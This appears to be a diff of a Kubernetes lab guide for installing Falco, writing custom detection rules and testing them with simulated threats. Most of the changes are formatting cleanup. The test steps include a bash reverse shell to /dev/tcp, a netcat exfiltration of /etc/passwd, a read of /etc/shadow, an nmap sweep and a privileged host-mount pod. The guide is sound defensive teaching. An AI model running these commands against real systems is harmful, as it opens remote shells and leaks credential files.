@@ -18,7 +18,6 @@ Deploy and configure Falco for runtime security monitoring, create custom rules,
 ## Step 1: Install Falco
 
 ```bash
-
 # Add Falco Helm repository
 
 helm repo add falcosecurity https://falcosecurity.github.io/charts
@@ -44,12 +43,9 @@ kubectl wait --for=condition=ready pod -l app.kubernetes.io/name=falco -n falco 
 kubectl logs -n falco -l app.kubernetes.io/name=falco --tail=20
 ```
 
-```
-
 ## Step 2: Understand Default Rules
 
 ```bash
-
 # View Falco rules
 
 kubectl exec -n falco $(kubectl get pod -n falco -l app.kubernetes.io/name=falco -o jsonpath='{.items[0].metadata.name}') \
@@ -65,23 +61,17 @@ kubectl exec -n falco $(kubectl get pod -n falco -l app.kubernetes.io/name=falco
 
 ```
 
-```
-
 ## Step 3: Test Default Rules
 
 ### 3.1 Create Test Namespace
 
 ```bash
-
 kubectl create namespace lab-falco
-```
-
 ```
 
 ### 3.2 Test: Shell in Container
 
 ```bash
-
 # Create test pod
 
 kubectl run test-shell --image=nginx:1.27 -n lab-falco
@@ -106,12 +96,9 @@ kubectl logs -n falco -l app.kubernetes.io/name=falco --tail=30 | grep -i "shell
 
 ```
 
-```
-
 ### 3.3 Test: Sensitive File Access
 
 ```bash
-
 # Try to read /etc/shadow (triggers alert)
 
 kubectl exec test-shell -n lab-falco -- cat /etc/shadow
@@ -125,12 +112,9 @@ kubectl logs -n falco -l app.kubernetes.io/name=falco --tail=20 | grep -i "shado
 
 ```
 
-```
-
 ### 3.4 Test: Write to Non-Temp Directory
 
 ```bash
-
 # Write to /etc (triggers alert)
 
 kubectl exec test-shell -n lab-falco -- touch /etc/test-file
@@ -140,12 +124,9 @@ kubectl exec test-shell -n lab-falco -- touch /etc/test-file
 kubectl logs -n falco -l app.kubernetes.io/name=falco --tail=20 | grep -i "write"
 ```
 
-```
-
 ### 3.5 Test: Unexpected Network Connection
 
 ```bash
-
 # Install curl in container
 
 kubectl exec test-shell -n lab-falco -- apt-get update
@@ -160,8 +141,6 @@ kubectl exec test-shell -n lab-falco -- curl -I https://example.com
 kubectl logs -n falco -l app.kubernetes.io/name=falco --tail=30
 ```
 
-```
-
 ## Step 4: Create Custom Rules
 
 ### 4.1 Create ConfigMap with Custom Rules
@@ -169,7 +148,6 @@ kubectl logs -n falco -l app.kubernetes.io/name=falco --tail=30
 Create `custom-falco-rules.yaml`:
 
 ```yaml
-
 apiVersion: v1
 kind: ConfigMap
 metadata:
@@ -263,18 +241,12 @@ data:
 ```
 
 ```
-
-```bash
-
 kubectl apply -f custom-falco-rules.yaml
-```
-
 ```
 
 ### 4.2 Update Falco Configuration
 
 ```bash
-
 # Update Falco to use custom rules
 
 helm upgrade falco falcosecurity/falco \
@@ -324,14 +296,11 @@ kubectl rollout status daemonset/falco -n falco
 kubectl logs -n falco -l app.kubernetes.io/name=falco --tail=50 | grep -i "custom"
 ```
 
-```
-
 ## Step 5: Test Custom Rules
 
 ### 5.1 Test Cryptocurrency Mining Detection
 
 ```bash
-
 # Create pod that simulates mining activity
 
 kubectl run fake-miner \
@@ -344,12 +313,9 @@ kubectl run fake-miner \
 kubectl logs -n falco -l app.kubernetes.io/name=falco --tail=20 | grep -i "cryptocurrency"
 ```
 
-```
-
 ### 5.2 Test Port Scanning Detection
 
 ```bash
-
 # Create pod with nmap (install first)
 
 kubectl run scanner \
@@ -370,12 +336,9 @@ kubectl exec scanner -n lab-falco -- nmap -sn 10.0.0.1/24 &
 kubectl logs -n falco -l app.kubernetes.io/name=falco --tail=20 | grep -i "port scanning"
 ```
 
-```
-
 ### 5.3 Test Package Management Detection
 
 ```bash
-
 # Run apt-get in container (triggers alert)
 
 kubectl exec test-shell -n lab-falco -- apt-get update
@@ -385,12 +348,9 @@ kubectl exec test-shell -n lab-falco -- apt-get update
 kubectl logs -n falco -l app.kubernetes.io/name=falco --tail=20 | grep -i "package"
 ```
 
-```
-
 ### 5.4 Test Privilege Escalation Detection
 
 ```bash
-
 # Try to use sudo (triggers alert)
 
 kubectl exec test-shell -n lab-falco -- which sudo
@@ -402,8 +362,6 @@ kubectl exec test-shell -n lab-falco -- sudo -l
 kubectl logs -n falco -l app.kubernetes.io/name=falco --tail=20 | grep -i "privilege escalation"
 ```
 
-```
-
 ## Step 6: Configure Falco Outputs
 
 ### 6.1 File Output
@@ -411,7 +369,6 @@ kubectl logs -n falco -l app.kubernetes.io/name=falco --tail=20 | grep -i "privi
 Update Falco configuration for file output:
 
 ```yaml
-
 apiVersion: v1
 kind: ConfigMap
 metadata:
@@ -437,12 +394,9 @@ data:
       - /etc/falco/rules.d/custom-rules.yaml
 ```
 
-```
-
 ### 6.2 Integrate with Falcosidekick (Optional)
 
 ```bash
-
 # Install Falcosidekick for alert routing
 
 helm install falcosidekick falcosecurity/falcosidekick \
@@ -458,14 +412,11 @@ helm upgrade falco falcosecurity/falco \
   --set falcosidekick.fullfqdn=falcosidekick:2801
 ```
 
-```
-
 ## Step 7: Real-World Threat Scenarios
 
 ### 7.1 Scenario: Container Escape Attempt
 
 ```bash
-
 # Create privileged pod (bad practice, for testing only)
 
 kubectl run escape-test \
@@ -483,12 +434,9 @@ kubectl exec escape-test -n lab-falco -- ls /host
 kubectl logs -n falco -l app.kubernetes.io/name=falco --tail=30 | grep -i "privileged"
 ```
 
-```
-
 ### 7.2 Scenario: Reverse Shell
 
 ```bash
-
 # Simulate reverse shell (for testing - don't do in production!)
 
 kubectl exec test-shell -n lab-falco -- bash -c 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1' &
@@ -498,12 +446,9 @@ kubectl exec test-shell -n lab-falco -- bash -c 'bash -i >& /dev/tcp/10.0.0.1/44
 kubectl logs -n falco -l app.kubernetes.io/name=falco --tail=20 | grep -i "shell"
 ```
 
-```
-
 ### 7.3 Scenario: Data Exfiltration
 
 ```bash
-
 # Simulate data exfiltration
 
 kubectl exec test-shell -n lab-falco -- bash -c 'cat /etc/passwd | nc 10.0.0.1 9999' &
@@ -513,14 +458,11 @@ kubectl exec test-shell -n lab-falco -- bash -c 'cat /etc/passwd | nc 10.0.0.1 9
 kubectl logs -n falco -l app.kubernetes.io/name=falco --tail=30
 ```
 
-```
-
 ## Step 8: Falco Rule Tuning
 
 ### 8.1 Create Exception List
 
 ```yaml
-
 # Add to custom-rules.yaml
 
 - list: allowed_shell_users
@@ -542,12 +484,9 @@ kubectl logs -n falco -l app.kubernetes.io/name=falco --tail=30
   priority: NOTICE
 ```
 
-```
-
 ### 8.2 Tune Rule Priority
 
 ```bash
-
 # Set minimum priority to WARNING (reduce noise)
 
 helm upgrade falco falcosecurity/falco \
@@ -556,14 +495,11 @@ helm upgrade falco falcosecurity/falco \
   --set falco.priority=warning
 ```
 
-```
-
 ## Step 9: Monitor and Analyze
 
 ### 9.1 View Real-Time Alerts
 
 ```bash
-
 # Follow Falco logs
 
 kubectl logs -n falco -l app.kubernetes.io/name=falco -f
@@ -577,12 +513,9 @@ kubectl logs -n falco -l app.kubernetes.io/name=falco | grep "Priority:CRITICAL"
 kubectl logs -n falco -l app.kubernetes.io/name=falco | grep "Cryptocurrency"
 ```
 
-```
-
 ### 9.2 Export Alerts
 
 ```bash
-
 # Export all alerts to file
 
 kubectl logs -n falco -l app.kubernetes.io/name=falco > falco-alerts.log
@@ -590,8 +523,6 @@ kubectl logs -n falco -l app.kubernetes.io/name=falco > falco-alerts.log
 # Parse JSON output
 
 kubectl logs -n falco -l app.kubernetes.io/name=falco | jq 'select(.priority=="Critical")'
-```
-
 ```
 
 ## Challenge Exercises
@@ -606,7 +537,6 @@ kubectl logs -n falco -l app.kubernetes.io/name=falco | jq 'select(.priority=="C
 ### Falco Not Detecting Events
 
 ```bash
-
 # Check driver status
 
 kubectl logs -n falco -l app.kubernetes.io/name=falco | grep -i "driver"
@@ -620,12 +550,9 @@ kubectl exec -n falco <pod-name> -- ls -la /root/.falco/
 
 ```
 
-```
-
 ### High CPU Usage
 
 ```bash
-
 # Check resource usage
 
 kubectl top pods -n falco
@@ -635,12 +562,9 @@ kubectl top pods -n falco
 
 ```
 
-```
-
 ### Missing Alerts
 
 ```bash
-
 # Check rule syntax
 
 kubectl exec -n falco <pod-name> -- falco --validate /etc/falco/rules.d/custom-rules.yaml
@@ -648,8 +572,6 @@ kubectl exec -n falco <pod-name> -- falco --validate /etc/falco/rules.d/custom-r
 # Check priority threshold
 
 kubectl logs -n falco -l app.kubernetes.io/name=falco | grep "Falco initialized"
-```
-
 ```
 
 ## Lab Summary
@@ -667,13 +589,10 @@ You learned:
 ## Cleanup
 
 ```bash
-
 kubectl delete namespace lab-falco
 helm uninstall falco -n falco
 helm uninstall falcosidekick -n falco
 kubectl delete namespace falco
-```
-
 ```
 
 ## Additional Resources
